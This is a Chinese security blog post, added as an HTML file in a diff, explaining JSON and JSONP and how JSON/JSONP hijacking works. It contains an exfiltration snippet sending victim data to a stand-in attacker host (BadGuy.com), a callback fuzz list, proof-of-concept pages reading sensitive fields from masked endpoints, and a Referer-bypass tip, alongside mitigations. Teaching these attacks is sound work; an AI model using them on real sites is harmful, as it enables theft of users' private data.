@@ -1,0 +1,424 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  
+
+  
+  <title>json及jsonp注入 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="json以及jsonp前言JSONP全名为JSON with Padding，其存在的意义便有绕过诸如同源策略强制执行XMLHttpRequest(AJAX requests)。是基于 JSON 格式的为解决跨域请求资源而产生的解决方案。他实现的基本原理是利用了 HTML 里  元素标签，远程调用 JSON 文件来实现数据传递。如要在 a.com 域下获取存在 b.com 的 JSON 数据( g">
+<meta name="keywords" content="渗透攻防">
+<meta property="og:type" content="article">
+<meta property="og:title" content="json及jsonp注入">
+<meta property="og:url" content="http://yoursite.com/2018/11/05/jsonp注入/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="json以及jsonp前言JSONP全名为JSON with Padding，其存在的意义便有绕过诸如同源策略强制执行XMLHttpRequest(AJAX requests)。是基于 JSON 格式的为解决跨域请求资源而产生的解决方案。他实现的基本原理是利用了 HTML 里  元素标签，远程调用 JSON 文件来实现数据传递。如要在 a.com 域下获取存在 b.com 的 JSON 数据( g">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="http://m.qpic.cn/psb?/V14K5DCn3C6bNV/BEyZxo0hGF3LRb*OJwrOuiTnkf0CMV7UAt7MeIbtvDs!/b/dEYBAAAAAAAA&bo=KAIQAQAAAAADBxk!&rf=viewer_4">
+<meta property="og:image" content="http://m.qpic.cn/psb?/V14K5DCn3C6bNV/*SaTFuXigD8mbFv54Bh97TfWBk32gEzmIWKk11bUV6U!/b/dDABAAAAAAAA&bo=XwJXAQAAAAARBzs!&rf=viewer_4">
+<meta property="og:image" content="http://a2.qpic.cn/psb?/V14K5DCn3C6bNV/tdi4L8ccsfuILgFAojEZp*2XMANIMDAbFYbSavZWeeY!/b/dDUBAAAAAAAA&ek=1&kp=1&pt=0&bo=VAf1AgAAAAADF5Y!&tl=1&vuin=275640346&tm=1541426400&sce=60-4-3&rf=viewer_4">
+<meta property="og:image" content="http://m.qpic.cn/psb?/V14K5DCn3C6bNV/qHNLr8Mtn4N5qXBBjh.5Bo.7b5N6vU.WpDaDNthU6fs!/b/dDYBAAAAAAAA&bo=nwR0AgAAAAADF98!&rf=viewer_4">
+<meta property="og:image" content="http://a2.qpic.cn/psb?/V14K5DCn3C6bNV/mMymXEDD2tt24*ZPIfCYq*CvZnKiQRZeHjkNde83r10!/b/dEkBAAAAAAAA&ek=1&kp=1&pt=0&bo=RwZEAgAAAAADFzU!&tl=1&vuin=275640346&tm=1541426400&sce=60-2-2&rf=viewer_4">
+<meta property="og:image" content="http://a4.qpic.cn/psb?/V14K5DCn3C6bNV/ZzlIYGzxIKQYWyZ5qIsRtmJn3YQPkKjc3rGPOHky7KY!/b/dEcBAAAAAAAA&ek=1&kp=1&pt=0&bo=jwJNAQAAAAADF*M!&tl=1&vuin=275640346&tm=1541422800&sce=60-2-2&rf=viewer_4">
+<meta property="og:image" content="https://i.imgur.com/KXw27s4.png">
+<meta property="og:updated_time" content="2018-12-06T08:04:42.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="json及jsonp注入">
+<meta name="twitter:description" content="json以及jsonp前言JSONP全名为JSON with Padding，其存在的意义便有绕过诸如同源策略强制执行XMLHttpRequest(AJAX requests)。是基于 JSON 格式的为解决跨域请求资源而产生的解决方案。他实现的基本原理是利用了 HTML 里  元素标签，远程调用 JSON 文件来实现数据传递。如要在 a.com 域下获取存在 b.com 的 JSON 数据( g">
+<meta name="twitter:image" content="http://m.qpic.cn/psb?/V14K5DCn3C6bNV/BEyZxo0hGF3LRb*OJwrOuiTnkf0CMV7UAt7MeIbtvDs!/b/dEYBAAAAAAAA&bo=KAIQAQAAAAADBxk!&rf=viewer_4">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-jsonp注入" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/11/05/jsonp注入/" class="article-date">
+  <time datetime="2018-11-04T16:00:00.000Z" itemprop="datePublished">2018-11-05</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      json及jsonp注入
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="json以及jsonp"><a href="#json以及jsonp" class="headerlink" title="json以及jsonp"></a>json以及jsonp</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>JSONP全名为JSON with Padding，其存在的意义便有绕过诸如同源策略强制执行XMLHttpRequest(AJAX requests)。是基于 JSON 格式的为解决跨域请求资源而产生的解决方案。他实现的基本原理是利用了 HTML 里 <script></script> 元素标签，远程调用 JSON 文件来实现数据传递。如要在 a.com 域下获取存在 b.com 的 JSON 数据( getUsers.JSON ):</p>
+<p>JSONP(JSON with Padding)是一个非官方的协议，它允许在服务器端集成Script tags返回至客户端，通过javascript callback的形式实现跨域访问（这仅仅是JSONP简单的实现形式）。</p>
+<p>JSONP注入是一个不太常见但影响非常广泛且极危险的漏洞，由于最近几年对JSON, web APIs以及跨域通信的需求增多，不得不引起我们的重视。</p>
+<h2 id="json基础"><a href="#json基础" class="headerlink" title="json基础"></a>json基础</h2><p>JSON能够以非常简单的方式来描述数据结构，XML能做的它都能做，因此在跨平台方面两者完全不分伯仲。<br>1、JSON只有两种数据类型描述符，大括号{}和方括号[]，其余英文冒号:是映射符，英文逗号,是分隔符，英文双引号”“是定义符。<br>2、大括号{}用来描述一组“不同类型的无序键值对集合”（每个键值对可以理解为OOP的属性描述），方括号[]用来描述一组“相同类型的有序数据集合”（可对应OOP的数组）。<br>3、上述两种集合中若有多个子项，则通过英文逗号,进行分隔。<br>4、键值对以英文冒号:进行分隔，并且建议键名都加上英文双引号”“，以便于不同语言的解析。<br>5、JSON内部常用数据类型无非就是字符串、数字、布尔、日期、null 这么几个，字符串必须用双引号引起来，其余的都不用，日期类型比较特殊，这里就不展开讲述了，只是建议如果客户端没有按日期排序功能需求的话，那么把日期时间直接作为字符串传递就好，可以省去很多麻烦。</p>
+<h2 id="json实例"><a href="#json实例" class="headerlink" title="json实例"></a>json实例</h2><pre><code>// 描述一个人 
+var person = {
+    &quot;Name&quot;: &quot;Bob&quot;, 
+    &quot;Age&quot;: 32, 
+    &quot;Company&quot;: &quot;IBM&quot;, 
+    &quot;Engineer&quot;: true } 
+// 获取这个人的信息 
+var personAge = person.Age; 
+// 描述几个人 
+var members = [ 
+{ 
+    &quot;Name&quot;: &quot;Bob&quot;, 
+    &quot;Age&quot;: 32, 
+    &quot;Company&quot;: &quot;IBM&quot;, 
+    &quot;Engineer&quot;: true 
+}, 
+{ 
+    &quot;Name&quot;: &quot;John&quot;, 
+    &quot;Age&quot;: 20, 
+    &quot;Company&quot;: &quot;Oracle&quot;, 
+    &quot;Engineer&quot;: false 
+},
+ {
+     &quot;Name&quot;: &quot;Henry&quot;, 
+    &quot;Age&quot;: 45,
+     &quot;Company&quot;: &quot;Microsoft&quot;,
+     &quot;Engineer&quot;: false 
+}
+             ] 
+// 读取其中John的公司名称 
+var johnsCompany = members[1].Company; 
+// 描述一次会议 
+var conference = { 
+&quot;Conference&quot;: &quot;Future Marketing&quot;, 
+&quot;Date&quot;: &quot;2012-6-1&quot;, 
+&quot;Address&quot;: &quot;Beijing&quot;, 
+&quot;Members&quot;: 
+[ 
+    { 
+        &quot;Name&quot;: &quot;Bob&quot;, 
+        &quot;Age&quot;: 32, 
+        &quot;Company&quot;: &quot;IBM&quot;, 
+        &quot;Engineer&quot;: true
+     }, 
+    { 
+        &quot;Name&quot;: &quot;John&quot;, 
+        &quot;Age&quot;: 20, 
+        &quot;Company&quot;: &quot;Oracle&quot;, 
+        &quot;Engineer&quot;: false 
+    }, 
+    { 
+        &quot;Name&quot;: &quot;Henry&quot;, 
+        &quot;Age&quot;: 45, 
+        &quot;Company&quot;: &quot;Microsoft&quot;, 
+        &quot;Engineer&quot;: false 
+    } 
+] 
+            } 
+// 读取参会者Henry是否工程师 
+var henryIsAnEngineer = conference.Members[2].Engineer;</code></pre><h2 id="什么是jsonp"><a href="#什么是jsonp" class="headerlink" title="什么是jsonp"></a>什么是jsonp</h2><p>1、一个众所周知的问题，Ajax直接请求普通文件存在跨域无权限访问的问题，甭管你是静态页面、动态网页、web服务、WCF，只要是跨域请求，一律不准；  </p>
+<p>2、不过我们又发现，Web页面上调用js文件时则不受是否跨域的影响（不仅如此，我们还发现凡是拥有”src”这个属性的标签都拥有跨域的能力，比如script、img、iframe）；  </p>
+<p>3、于是可以判断，当前阶段如果想通过纯web端（ActiveX控件、服务端代理、属于未来的HTML5之Websocket等方式不算）跨域访问数据就只有一种可能，那就是在远程服务器上设法把数据装进js格式的文件里，供客户端调用和进一步处理；  </p>
+<p>4、恰巧我们已经知道有一种叫做JSON的纯字符数据格式可以简洁的描述复杂数据，更妙的是JSON还被js原生支持，所以在客户端几乎可以随心所欲的处理这种格式的数据；  </p>
+<p>5、这样子解决方案就呼之欲出了，web客户端通过与调用脚本一模一样的方式，来调用跨域服务器上动态生成的js格式文件（一般以JSON为后缀），显而易见，服务器之所以要动态生成JSON文件，目的就在于把客户端需要的数据装入进去。  （重点–简而言之。我们要加载远程文件而js又可以跨域，那么我们跨域调用远程js文件，便可以实现同源策略之下的跨域）</p>
+<p>6、客户端在对JSON文件调用成功之后，也就获得了自己所需的数据，剩下的就是按照自己需求进行处理和展现了，这种获取远程数据的方式看起来非常像AJAX，但其实并不一样。  </p>
+<p>7、为了便于客户端使用数据，逐渐形成了一种非正式传输协议，人们把它称作JSONP，该协议的一个要点就是允许用户传递一个callback参数给服务端，然后服务端返回数据时会将这个callback参数作为函数名来包裹住JSON数据，这样客户端就可以随意定制自己的函数来自动处理返回数据了。 </p>
+<h2 id="jsonp跨域实例"><a href="#jsonp跨域实例" class="headerlink" title="jsonp跨域实例"></a>jsonp跨域实例</h2><p>前端<br>jsonp.html</p>
+<pre><code>&lt;!DOCTYPE html&gt; 
+&lt;html&gt;
+&lt;body&gt;
+&lt;p&gt;jsonp测试页面&lt;/p&gt;
+&lt;meta charset=&quot;utf-8&quot;  content=&quot;text/html; charset=gb2312&quot;/&gt;
+&lt;head&gt; &lt;title&gt;&lt;/title&gt; &lt;script type=&quot;text/javascript&quot;&gt;
+    // 得到航班信息查询结果后的回调函数
+    var flightHandler = function(data){
+        alert(&apos;你查询的航班结果是：票价 &apos; + data.price + &apos; 元，&apos; + &apos;余票 &apos; + data.tickets + &apos; 张。&apos;);
+    };
+    // 提供jsonp服务的url地址（不管是什么类型的地址，最终生成的返回值都是一段javascript代码）
+    var url = &quot;http://127.0.0.1/999.js?code=CA1998&amp;callback=flightHandler&quot;;//这里我们直接写在了js里传参，很多是在get的方式url里传参，而不是固定好了的。
+    // 创建script标签，设置其属性
+    var script = document.createElement(&apos;script&apos;);
+    script.setAttribute(&apos;src&apos;, url);
+    // 把script标签加入head，此时调用开始
+    document.getElementsByTagName(&apos;head&apos;)[0].appendChild(script); 
+    &lt;/script&gt; &lt;/head&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre><p>后端则有一个规则生成了一段这样的代码提供给jsonp.html（服务端的实现这里就不演示了，与你选用的语言无关，说到底就是拼接字符串）：</p>
+<p>示例固定的写一个json</p>
+<pre><code>flightHandler({
+    &quot;code&quot;: &quot;CA1998&quot;,
+    &quot;price&quot;: 1780,
+    &quot;tickets&quot;: 5
+});</code></pre><p>效果：<br><img src="http://m.qpic.cn/psb?/V14K5DCn3C6bNV/BEyZxo0hGF3LRb*OJwrOuiTnkf0CMV7UAt7MeIbtvDs!/b/dEYBAAAAAAAA&bo=KAIQAQAAAAADBxk!&rf=viewer_4" alt></p>
+<p>通过上述描述可以知道，若想实现JSONP，除了前端部分之外，还需要后端的配合，后端需返回符合JSONP要求的数据。<br>比如java可以这样写：</p>
+<pre><code>Map&lt;String,String&gt; map = new HashMap&lt;String,String&gt;();  
+map.put(&quot;result&quot;, &quot;content&quot;);  
+String resultJSON = JSONObject.toJSONString(map);   
+
+try {   
+    PrintWriter out = response.getWriter();   
+    String jsonpCallback = request.getParameter(&quot;jsonpCallback&quot;);//回调函数   
+    out.println(jsonpCallback+&quot;(&quot;+resultJSON+&quot;)&quot;);//返回jsonp格式数据 ，要用callback包装下  
+    out.flush();   
+    out.close();   
+} 
+catch (Exception e)   
+{ e.printStackTrace(); }  </code></pre><h1 id="json劫持"><a href="#json劫持" class="headerlink" title="json劫持"></a>json劫持</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p><img src="http://m.qpic.cn/psb?/V14K5DCn3C6bNV/*SaTFuXigD8mbFv54Bh97TfWBk32gEzmIWKk11bUV6U!/b/dDABAAAAAAAA&bo=XwJXAQAAAAARBzs!&rf=viewer_4" alt></p>
+<p>（1）.你正常访问信任站点（<a href="http://www.Bank.com），然后登陆信任站点。" target="_blank" rel="noopener">http://www.Bank.com），然后登陆信任站点。</a></p>
+<p>（2）.信任站点通过你的验证，并返回Cookie。</p>
+<p>（3）.这时，在你还没有登出信任站点之前，你再打开了一个浏览器的tab页，并访问了一个恶意站点（<a href="http://www.BadGuy.com）。" target="_blank" rel="noopener">www.BadGuy.com）。</a></p>
+<p>（4）.恶意站点向请求用户访问<a href="http://www.Bank.com的一个资源。" target="_blank" rel="noopener">http://www.Bank.com的一个资源。</a></p>
+<p>（5）.浏览器带着之前的Cookie信息，向信任站点<a href="http://www.Bank.com发出了一个GET请求。" target="_blank" rel="noopener">http://www.Bank.com发出了一个GET请求。</a></p>
+<p>（6）.信任站点验证的Cookie信息通过，根据请求返回一个JSON数组（如果不清楚JSON，可以参考《JSON入门指南》）。</p>
+<p>（7）.你的浏览器收到来自<a href="http://www.Bank.com的响应后，转发响应中的JSON信息给恶意站点。" target="_blank" rel="noopener">http://www.Bank.com的响应后，转发响应中的JSON信息给恶意站点。</a></p>
+<p>至此，恶意站点拿到你关于<a href="http://www.Bank.com的信息。" target="_blank" rel="noopener">http://www.Bank.com的信息。</a></p>
+<p>到这里，你应该有对JavaScript Hijacking有一个大概的概念，它确实和CSRF很相像，唯一不同的是，CSRF是模拟你的身份去发送请求，JavaScript Hijacking是模拟你的身份，窃取你在服务器上的私隐信息。</p>
+<h2 id="JavaScript-Hijacking攻击示范代码："><a href="#JavaScript-Hijacking攻击示范代码：" class="headerlink" title="JavaScript Hijacking攻击示范代码："></a>JavaScript Hijacking攻击示范代码：</h2><p>演示代码之前，首先明确几点：</p>
+<p>（1）.恶意站点的攻击目标是明确的（这里目标就是<a href="http://www.Bank.com）。" target="_blank" rel="noopener">http://www.Bank.com）。</a></p>
+<p>（2）.恶意站点是通过用户给它返回信任网站的JSON数组（为什么是JSON数组？普通的JSON对象不行么？这个下面会提到！），从而获取用户私隐信息的。也就是说所谓的隐私数据，也就是这些JSON数组里面的数据，所以信任站点返回的不是JSON数组的数据或者JSON里面的信息是垃圾信息，那么这个恶意站点是徒劳的。</p>
+<p>（3）.恶意站点必须实先知道用户返回的JSON的结构。</p>
+<p>（4）.恶意站点能且只能发送GET请求……</p>
+<p>（5）.这种攻击是需要浏览器支持的，至于为什么看下面吧。</p>
+<p>恩，下面看一下攻击代码吧:&gt;</p>
+<p>这个恶意站点<a href="http://www.BadGuy.com针对www.Bank.com的攻击代码：" target="_blank" rel="noopener">www.BadGuy.com针对www.Bank.com的攻击代码：</a></p>
+<pre><code>&lt;script type=&quot;text/javascript&quot;&gt;
+Object.prototype.__defineSetter__(&apos;money&apos;, function(obj) { var objString = &quot;&quot;;  for (fld in this) {objString += fld + &quot;: &quot; + this[fld] + &quot;, &quot;; }  req.open(&quot;GET&quot;, &quot;http://www.BadGuy.com?obj=&quot; +escape(objString),true); } req.send(null); );
+&lt;/script&gt;
+&lt;script type=&quot;text/javascript&quot; src=&quot;http://www.Bank.com/UserInfo&quot;&gt;&lt;/script&gt;</code></pre><p>在用户访问恶意网站时：</p>
+<pre><code>&lt;script type=&quot;text/javascript&quot; src=&quot;http://www.Bank.com/UserInfo&quot;&gt;&lt;/script&gt;</code></pre><p>（1）.这段JS代码会要求浏览器发送一个GET请求到<a href="http://www.Bank.com/UserInfo，于是浏览器按照指示，带上本地的Cookie信息，发送一个http的GET请求。" target="_blank" rel="noopener">http://www.Bank.com/UserInfo，于是浏览器按照指示，带上本地的Cookie信息，发送一个http的GET请求。</a></p>
+<p>（2）.<a href="http://www.Bank.Com接受到请求后，确认身份后，响应请求返回了一个JSON数组/JavaScript代码段。" target="_blank" rel="noopener">www.Bank.Com接受到请求后，确认身份后，响应请求返回了一个JSON数组/JavaScript代码段。</a></p>
+<p>（3）.客户端接受到这段JS脚本后，如果返回的是一个JSON数组，比如：</p>
+<pre><code>[{&quot;Id&quot;:3,&quot;Name&quot;:hyddd,&quot;Money&quot;:10000}]</code></pre><p>JSON数组被认为是一段可执行的JavaScript脚本，于是浏览器会解析执行。</p>
+<p>如果返回的是一个JSON对象呢？</p>
+<pre><code>{&quot;Id&quot;:3,&quot;Name&quot;:hyddd,&quot;Money&quot;:10000}</code></pre><p>呵呵，这个是不会被浏览器执行的，因为浏览器认为：它不是一个JavaScript脚本。</p>
+<p>如果它返回的是一个JavaScript脚本的话，恩，这得具体问题具体分析了，不一定能拿到什么数据。</p>
+<p>（4）.看下面这段JavaScript脚本：</p>
+<pre><code>&lt;script type=&quot;text/javascript&quot;&gt;
+Object.prototype.__defineSetter__(&apos;Money&apos;, function(obj) { var objString = &quot;&quot;;  for (fld in this) {objString += fld + &quot;: &quot; + this[fld] + &quot;, &quot;; }  req.open(&quot;GET&quot;, &quot;http://www.BadGuy.com?obj&quot;= +escape(objString),true); } req.send(null); );
+&lt;/script&gt;</code></pre><p>它的作用就是发送受害者的私隐信息到恶意站点的。</p>
+<p>这里可能有人不理解，我大概说一下：</p>
+<p>Object.prototype.<strong>defineSetter</strong>，可以看做是JavaScript中的Hook（有人把这个称为JavaScript函数劫持，注意JavaScript的函数劫持和JavaScript Hijacking不是同一个概念，JavaScript Hijacking的核心思想和CSRF攻击的核心思想应该是一致的），这里是对Object的Money属性设置了一个Hook，在JavaScript中，由于其他的对象都是派生自Object的，所以这段代码就对所有对象的Money属性都做了一个Hook，当有对象设置它的Money属性时，都会触发上面这段代码的运行。注意的是：<strong>defineSetter</strong>这个在IE系列的浏览器好像是不受支持的（在IE6下试了不行），但FireFox系列的浏览器是肯定支持的。</p>
+<p>后面的var objString=””…这就是发送受害者信息到恶意站点了，这里不说了。</p>
+<p>当浏览器解析（3）中的JSON数组时，会新建一个对象并赋值，这时候就出发了上面这段代码，结果私隐信息就发送到恶意站点了。</p>
+<p>通过  </p>
+<pre><code>Object.prototype.__defineSetter__</code></pre><p>这个函数来触发自己的恶意代码。<br>但是这个函数在当前的新版本chrome和firefox中都已经失效了。</p>
+<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>1、验证 HTTP Referer 头信息；  </p>
+<p>2、在请求中添加 csrfToken 并在后端进行验证；  </p>
+<h1 id="jsonp劫持"><a href="#jsonp劫持" class="headerlink" title="jsonp劫持"></a>jsonp劫持</h1><h2 id="寻找jsonp的接口"><a href="#寻找jsonp的接口" class="headerlink" title="寻找jsonp的接口"></a>寻找jsonp的接口</h2><p>1.burp抓包，一般有jsonp的数据传输会在mimetype中显示为script，通过排序可以快速得找到</p>
+<p><img src="http://a2.qpic.cn/psb?/V14K5DCn3C6bNV/tdi4L8ccsfuILgFAojEZp*2XMANIMDAbFYbSavZWeeY!/b/dDUBAAAAAAAA&ek=1&kp=1&pt=0&bo=VAf1AgAAAAADF5Y!&tl=1&vuin=275640346&tm=1541426400&sce=60-4-3&rf=viewer_4" alt></p>
+<p><img src="http://m.qpic.cn/psb?/V14K5DCn3C6bNV/qHNLr8Mtn4N5qXBBjh.5Bo.7b5N6vU.WpDaDNthU6fs!/b/dDYBAAAAAAAA&bo=nwR0AgAAAAADF98!&rf=viewer_4" alt></p>
+<p>2.火狐控制台查找包</p>
+<p><img src="http://a2.qpic.cn/psb?/V14K5DCn3C6bNV/mMymXEDD2tt24*ZPIfCYq*CvZnKiQRZeHjkNde83r10!/b/dEkBAAAAAAAA&ek=1&kp=1&pt=0&bo=RwZEAgAAAAADFzU!&tl=1&vuin=275640346&tm=1541426400&sce=60-2-2&rf=viewer_4" alt></p>
+<p>3.fuzz</p>
+<p>如果jsonp的接口没有敏感信息传输，json数据包中恰好有的话，我们可以尝试一下程序员是否有开发jsonp的格式，大多数程序员喜欢把jsonp的回传参数命名为callback</p>
+<p>当然还有其他的可能，字典用Intruder Fuzz一下试试：</p>
+<pre><code>callback=attack
+cb=attack
+call=attack
+jsonp=attack
+jsonpcallback=attack
+jsonpcb=attack
+json=attack
+jsoncallback=attack
+jcb=attack</code></pre><h2 id="某云实例"><a href="#某云实例" class="headerlink" title="某云实例"></a>某云实例</h2><p><img src="http://a4.qpic.cn/psb?/V14K5DCn3C6bNV/ZzlIYGzxIKQYWyZ5qIsRtmJn3YQPkKjc3rGPOHky7KY!/b/dEcBAAAAAAAA&ek=1&kp=1&pt=0&bo=jwJNAQAAAAADF*M!&tl=1&vuin=275640346&tm=1541422800&sce=60-2-2&rf=viewer_4" alt></p>
+<p>复制到url里便可以检验是否存在jsonp接口漏洞。</p>
+<p>修改callback原函数便可将json数据全部显示出来，一些敏感信息。</p>
+<p>poc </p>
+<pre><code>&lt;script&gt;
+function peiqi(json){
+
+    alert(json.result.pin)
+}
+&lt;/script&gt;
+&lt;script src=&quot;https://xx.xx.xx.xx/menu/getUserMenu?callback=peiqi&quot;&gt;&lt;/script&gt;</code></pre><p>poc可以继续构造制定发送到自己的页面，可见jsonp的原理与csrf基本为一致的，利用用户的身份来做一些事情，或者发送自己的信息给别人，</p>
+<h2 id="某X-jsonp"><a href="#某X-jsonp" class="headerlink" title="某X jsonp"></a>某X jsonp</h2><p><img src="https://i.imgur.com/KXw27s4.png" alt></p>
+<p>POC</p>
+<pre><code>&lt;script&gt;
+function peiqi(json){
+    alert(json.userName)
+}
+&lt;/script&gt;
+&lt;script src=&quot;http://XX.XXXXX.com/checkLogin?callback=peiqi&amp;_=15436278817&quot;&gt;&lt;/script&gt;</code></pre><p>目前挖掘jsonp 一般是F12 寻找callback函数，推荐一款自动检测XSS jsonp的谷歌插件 XssSniper</p>
+<h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><p>一些对referer 进行验证，但是有的时候空referer可以绕过验证。</p>
+<hr>
+<p>参考：<a href="https://blog.csdn.net/yjclsx/article/details/80340901" target="_blank" rel="noopener">https://blog.csdn.net/yjclsx/article/details/80340901</a><br>参考：<a href="http://www.cnblogs.com/hyddd/archive/2009/07/02/1515768.html" target="_blank" rel="noopener">http://www.cnblogs.com/hyddd/archive/2009/07/02/1515768.html</a><br>参考：<a href="https://shiyousan.com/post/635441704246553316" target="_blank" rel="noopener">https://shiyousan.com/post/635441704246553316</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/11/05/jsonp注入/" data-id="ck0l0oh9e000qpy2i0c73ks8r" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/渗透攻防/">渗透攻防</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2018/11/11/web漏洞弱口令/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          web漏洞之弱口令
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2018/10/28/信息泄露/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">常见信息泄露</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web漏洞/">web漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/杂/">杂</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/渗透攻防/">渗透攻防</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/python/" style="font-size: 14px;">python</a> <a href="/tags/web漏洞/" style="font-size: 18px;">web漏洞</a> <a href="/tags/杂/" style="font-size: 16px;">杂</a> <a href="/tags/渗透攻防/" style="font-size: 12px;">渗透攻防</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">May 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/02/">February 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">October 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">September 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2019/06/25/csp内容安全策略/">csp内容安全策略</a>
+          </li>
+        
+          <li>
+            <a href="/2019/05/25/thinkphp3.2.3/">thinkphp框架学习</a>
+          </li>
+        
+          <li>
+            <a href="/2019/05/17/url跳转实战/">渗透之url跳转</a>
+          </li>
+        
+          <li>
+            <a href="/2019/04/20/反序列化学习/">PHP反序列化学习</a>
+          </li>
+        
+          <li>
+            <a href="/2019/04/14/2019DDCTF/">2019DDCTF</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2019 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
